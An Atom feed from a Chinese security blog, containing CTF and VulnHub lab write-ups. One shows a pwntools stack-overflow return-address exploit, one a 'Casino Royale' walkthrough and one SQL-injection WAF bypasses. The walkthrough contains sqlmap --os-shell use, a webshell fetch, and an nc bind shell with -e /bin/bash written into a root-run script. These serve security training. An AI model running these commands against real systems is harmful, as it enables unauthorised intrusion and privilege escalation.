<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fidcer&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vuln.top/"/>
  <updated>2019-04-19T12:48:16.687Z</updated>
  <id>https://vuln.top/</id>
  
  <author>
    <name>Fidcer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Retaddr</title>
    <link href="https://vuln.top/2019/04/19/Retaddr/"/>
    <id>https://vuln.top/2019/04/19/Retaddr/</id>
    <published>2019-04-19T04:00:37.803Z</published>
    <updated>2019-04-19T12:48:16.687Z</updated>
    
    <content type="html"><![CDATA[<p>###Retaddr</p><p>这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址</p><p>通过checksec检查编译的程序，程序为32位 开启NX保护。</p><p><img src="http://118.126.66.150/images/2019/04/18/F83B815C-B7E0-4A92-AE3C-605E6D50AFDE.jpg" alt="image-20190414200433236"></p><p>将程序放入32位的ida F5反编译，</p><p><img src="http://118.126.66.150/images/2019/04/18/B933DFBA-1D00-479B-A5B0-87BD1DEF82B0.jpg" alt="B933DFBA-1D00-479B-A5B0-87BD1DEF82B0"></p><p>点开stkof函数，可以看到字符串距离ebp的长度为0x108</p><p><img src="http://118.126.66.150/images/2019/04/18/A959A146-6E01-4FE4-A8B0-5028F779760E.jpg" alt="A959A146-6E01-4FE4-A8B0-5028F779760E"></p><p>那么栈的结构就为</p><p><img src="http://118.126.66.150/images/2019/04/18/C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80.jpg" alt="C2F68AF7-CE1D-4D78-A299-3A1AEE7CEA80"></p><p>我们现在只需要找到正确的返回地址就能拿到flag，我们看到ida中有一个getflag的函数</p><p><img src="http://118.126.66.150/images/2019/04/18/D866699F-0DD4-4777-8CD8-D2431CC6A79F.jpg" alt="D866699F-0DD4-4777-8CD8-D2431CC6A79F"></p><p>我们需要找到getflag函数的入口，在ida中按tab 发现getflag的地址为0x0804856B</p><p><img src="http://118.126.66.150/images/2019/04/19/D5522D7C-8337-4562-BF5C-A212C2BD8D8B-2.jpg" alt="image-20190414201858448"></p><p>那么我们的payload就写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x108*&apos;a&apos;+&apos;bbbb&apos;+0x0804856B</span><br></pre></td></tr></table></figure><p><img src="http://118.126.66.150/images/2019/04/18/B0C22B76-FF5F-44B5-A296-135444AF5A20.jpg" alt="B0C22B76-FF5F-44B5-A296-135444AF5A20"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; target = 0x0804856B</span><br><span class="line">&gt;&gt;&gt; r = remote(&apos;192.168.235.143&apos;,9992)</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992</span><br><span class="line">[x] Opening connection to 192.168.235.143 on port 9992: Trying 192.168.235.143</span><br><span class="line">[+] Opening connection to 192.168.235.143 on port 9992: Done</span><br><span class="line">&gt;&gt;&gt; payload = 0x108*&apos;a&apos;+&apos;bbbb&apos;+p32(target)</span><br><span class="line">&gt;&gt;&gt; r.sendline(payload)</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Do you know &quot;return address&quot;?\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;You got the right return address!\n&apos;</span><br><span class="line">&gt;&gt;&gt; r.recvline()</span><br><span class="line">&apos;Take your flag and keep going: 123\n&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 target，即，此时的栈结构为</p><p><img src="http://118.126.66.150/images/2019/04/19/80DBDD44-F385-4B2D-BD91-0707261C8082ccabc05eddf0d711.jpg" alt="80DBDD44-F385-4B2D-BD91-0707261C8082"></p><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式需要用pwn模块中的p32转换为机器语言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;###Retaddr&lt;/p&gt;
&lt;p&gt;这是最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址&lt;/p&gt;
&lt;p&gt;通过checksec检查编译的程序，程序为32位 开启NX保护。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://118.126.66.150/images/2
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Casino Royale: 1</title>
    <link href="https://vuln.top/2019/02/27/casino/"/>
    <id>https://vuln.top/2019/02/27/casino/</id>
    <published>2019-02-27T15:31:31.756Z</published>
    <updated>2019-03-05T03:47:32.188Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Casino-Royale-1"><a href="#Casino-Royale-1" class="headerlink" title="Casino Royale: 1"></a>Casino Royale: 1</h1><h2 id="难度："><a href="#难度：" class="headerlink" title="难度："></a>难度：</h2><p>Intermediate</p><h2 id="关于："><a href="#关于：" class="headerlink" title="关于："></a>关于：</h2><p>Will you gain your status as a 00 agent?</p><p>题目地址：<a href="https://www.vulnhub.com/entry/casino-royale-1,287/#" target="_blank" rel="noopener">https://www.vulnhub.com/entry/casino-royale-1,287/#</a></p><h2 id="Flags"><a href="#Flags" class="headerlink" title="Flags:"></a>Flags:</h2><p>您的目标是获取root和Flag is /root/flag/flag.sh</p><h2 id="Write-Up："><a href="#Write-Up：" class="headerlink" title="Write Up："></a>Write Up：</h2><h3 id="0x01-获取root"><a href="#0x01-获取root" class="headerlink" title="0x01 获取root"></a>0x01 获取root</h3><p>1.通过nmap扫描靶机端口版本，发现存在四个端口：21、25、80、8081<br><code>nmap -sV x.x.x.x</code><br><img src="http://118.126.66.150/images/2019/03/05/1.jpg" alt="image.jpg"></p><p>2.我们从80端口入手，首先查看网页的源代码并无发现线索，其次对80端口进行目录爆破找到一个phpmyadmin的登陆页面和一个install<br><code>dirb [url]</code><br><img src="http://118.126.66.150/images/2019/03/05/2.jpg" alt="image.jpg"></p><p>3.我们开打install页面出现这样一个界面，点击cliek to start install 后页面报错<br><img src="http://118.126.66.150/images/2019/03/05/3.jpg" alt="image.jpg"></p><p>4.存在install页面说明网站肯定存在这个cms，我们查找相关cms版本信息并获取到源代码且存在一个exp漏洞<br><img src="http://118.126.66.150/images/2019/03/05/4.jpg" alt="image.jpg"></p><p>5.翻开源代码后台路径是<code>pokeradmin</code>，并且发现登陆处并且未做sql注入防护<br><img src="http://118.126.66.150/images/2019/03/05/5.jpg" alt="image.jpg"></p><p>6.直接使用sqlmap跑取账户密码后getshell<br><code>sqlmap.py -u &#39;http://192.168.235.140:80/pokeradmin/&#39; --data=&#39;op=adminlogin&amp;username=admin&amp;password=admin&#39; --level=5 --risk=3 --os-shell</code><br><img src="http://118.126.66.150/images/2019/03/05/6.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/7.jpg" alt="image.jpg"></p><p>7.将kali开一个apache把一句话放在/var/www/html中，然后在靶机的shell中运行wget<br><img src="http://118.126.66.150/images/2019/03/05/8.jpg" alt="image.jpg"></p><p>8.打开中国蚁剑或中国菜刀（效果是一样的）配置如下<br><img src="http://118.126.66.150/images/2019/03/05/9.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/10.jpg" alt="image.jpg"></p><p>9.getshell后我们先将数据库的账户密码保存下来<br><code>valenka:11archives11!</code></p><p><img src="http://118.126.66.150/images/2019/03/05/11.jpg" alt="image.jpg"></p><p>10.在一段查看后没有发现有价值的信息，查看8081端口，主页面有一个Run Data Collect的按钮，点击后访问到collect.php</p><p><img src="http://118.126.66.150/images/2019/03/05/12.jpg" alt="image.jpg"></p><p>11.因为我们已经拿到www-data的权限了所以我们可以通过find来查找collect.php，找到8081端口的主目录在/opt/casino-royale/<br><code>find / -name [name]</code><br><img src="http://118.126.66.150/images/2019/03/05/13.jpg" alt="image.jpg"></p><p>12.进入8081端口主目录后查看文件权限<br><img src="http://118.126.66.150/images/2019/03/05/14.jpg" alt="image.jpg"></p><p>13.查看权限后发现只有<code>casino-data-collection.py</code>这个文件我可以修改，cat查看文件内容，python文件打开了<code>user-data.log</code>继续查看里面内容与collect.php内容一样<br><img src="http://118.126.66.150/images/2019/03/05/15.jpg" alt="image.jpg"></p><p>14.继续查看<code>collect.php</code>，基本了解程序大概的过程和出题人的思路，<code>collect.php</code>为root权限只可读所以不能更改但是执行的<code>casino-data-collection.py</code>为www-data组所以可以修改，而<code>casino-data-collection.py</code>打开了<code>user-data.log</code>所以php读到了log的内容，所以我们只要修改python文件即可获取到le的权限<br>解题思路：在python文件中通过os模块执行系统命令返回nc拿到le权限<br><img src="http://118.126.66.150/images/2019/03/05/16.jpg" alt="image.jpg"></p><p><img src="http://118.126.66.150/images/2019/03/05/17.jpg" alt="image.jpg"></p><p>15.修改python后，再在浏览器重新打开页面靶机会开启一个带bash的1111端口，使用攻击机的nc连接,获取到le的权限<br><img src="http://118.126.66.150/images/2019/03/05/18.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/19.jpg" alt="image.jpg"></p><p>16.但是这是一个半交互式的页面无法切换账户，通过查阅资料可以通过python调用本地shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.py</span><br><span class="line"></span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure></p><p><img src="http://118.126.66.150/images/2019/03/05/20.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/21.jpg" alt="image.jpg"></p><p>17.在获取到le的交互式shell后尝试第九步中valenka的账户密码登录。成功登陆但是先切回le，exit退出<br><code>valenka:11archives11!</code><br><img src="http://118.126.66.150/images/2019/03/05/22.jpg" alt="image.jpg"></p><p>18.查看run.sh，并尝试运行<code>mi6_detect_test</code>这个程序，发现与run.sh中的内容相同，我猜测<code>mi6_detect_test</code>就是将run.sh运行<br><img src="http://118.126.66.150/images/2019/03/05/23.jpg" alt="image.jpg"><br><img src="http://118.126.66.150/images/2019/03/05/24.jpg" alt="image.jpg"></p><p>18.<code>mi6_detect_test</code>为root所以我们通过echo命令把后门写入run.sh在运行mi6既可获取到root权限<br><code>echo &quot;nc -lvvp 1234 -t -e /bin/bash&quot; &gt;&gt; run.sh</code><br><img src="http://118.126.66.150/images/2019/03/05/25.jpg" alt="image.jpg"></p><p><img src="http://118.126.66.150/images/2019/03/05/26.jpg" alt="image.jpg"></p><p>19.成功监听端口，攻击机nc连接靶机，并getflag<br><img src="http://118.126.66.150/images/2019/03/05/27.jpg" alt="image.jpg"></p><p>难点总结：<br>1.python半交互式切换到全交互式<br>2.mi6_detect_test和run.sh程序的关联<br>3.理清这几个程序之间的关系<br>4.无法通过内核漏洞提权</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Casino-Royale-1&quot;&gt;&lt;a href=&quot;#Casino-Royale-1&quot; class=&quot;headerlink&quot; title=&quot;Casino Royale: 1&quot;&gt;&lt;/a&gt;Casino Royale: 1&lt;/h1&gt;&lt;h2 id=&quot;难度：&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>总结2018</title>
    <link href="https://vuln.top/2019/02/24/%E6%80%BB%E7%BB%932018%E5%B9%B4/"/>
    <id>https://vuln.top/2019/02/24/总结2018年/</id>
    <published>2019-02-24T13:18:02.000Z</published>
    <updated>2019-02-23T19:30:11.491Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>isg 3道web wp</title>
    <link href="https://vuln.top/2019/02/21/77/"/>
    <id>https://vuln.top/2019/02/21/77/</id>
    <published>2019-02-21T04:16:48.765Z</published>
    <updated>2019-02-23T15:15:00.592Z</updated>
    
    <content type="html"><![CDATA[<!--markdown-->第一题:calc<br><br>calc看样子是命令执行<br>通过n次尝试，成功执行代码<br><img src="http://118.126.66.150/52sec/08/3324016975.png" alt="W))I3(_DS[0$}GKXVHKJJ3W.png][1]![Q8F5HGA8WLF@W2{UER3E%MV.png][2]直接cat flag![R(IAP19Y7X~$IFQ9RRWP$YN.png][3]第二题:secret首先打开页面看到的是这个页面输入密码后![R9U))_{K5$~%W@LE00W4SDF.png][4]国际惯例查看下源代码，很兴奋的发现有flag![`]O}YTYQ84FF{WQD`F`PGN7.png"><br><br>base64解码！！！<br><img src="http://118.126.66.150/52sec/08/3038191672.png" alt="XDG9H2U$Z_)28NJKM3{BX%P.png"><br>发现啥都没有<br>被骗了。。。<br>然后我们get下/<br><img src="http://118.126.66.150/52sec/08/676655742.png" alt="LOG9$7@TZR$4J8`~LJ%6{24.png"><br>发现有个差不多的东西继续base64解码<br><img src="http://118.126.66.150/52sec/08/430533169.png" alt="B0VF58}S6FWXQ@A7KNFJ$2W.png"><br>成功获取flag<br><br>第三题:news<br>看样子是一道注入题，给了一个app.py<br>链接：<a href="https://pan.baidu.com/s/18Ro2aNB3wGrpVlbW5jLk8w" target="_blank" rel="noopener">https://pan.baidu.com/s/18Ro2aNB3wGrpVlbW5jLk8w</a> 密码：6noe<br>看了下源码很明显存在sql注入<br>找到过滤的关键字，判断条件估计就是写在codesafe类里面了<br><img src="http://118.126.66.150/52sec/08/1837997295.png" alt="55L(DADABDD2EL2(G_0Y\]E5.png"><br>果然<br><img src="http://118.126.66.150/52sec/08/1837997295.png" alt="KSXVU)F\]05@B_IMBA2I`}IJ.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if re.search(&quot;select&quot;, n) or re.search(&quot; &quot;, n) or re.search(&quot;where&quot;, n) or re.search(&quot;=&quot;, n) or re.search(&quot;&apos;&quot;, n):</span><br></pre></td></tr></table></figure><p>但是search不会匹配大小写那么我们可以从大小写入手过滤waf,空格则用/**/来代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n</span><br></pre></td></tr></table></figure></p><p>判断列数量<br>2是正常，3则返回异常，有2列</p><p><img src="http://118.126.66.150/52sec/08/175972947.png" alt="H$4ACG~1W}312_JQH5K2JHQ.png"><br>直接使用union select 联合查询<br><img src="http://118.126.66.150/52sec/08/2006292326.png" alt="C0119`UFZ(~TV_9`QV`70$G.png"><br>成功返回说明数据库表是flag<br><img src="http://118.126.66.150/52sec/08/1765850669.png" alt="UWLZ87$J)R7OIVAZC{1DB66.png"><br>列尝试也使用flag<br>成功爆出flag</p>]]></content>
    
    <summary type="html">
    
      
      
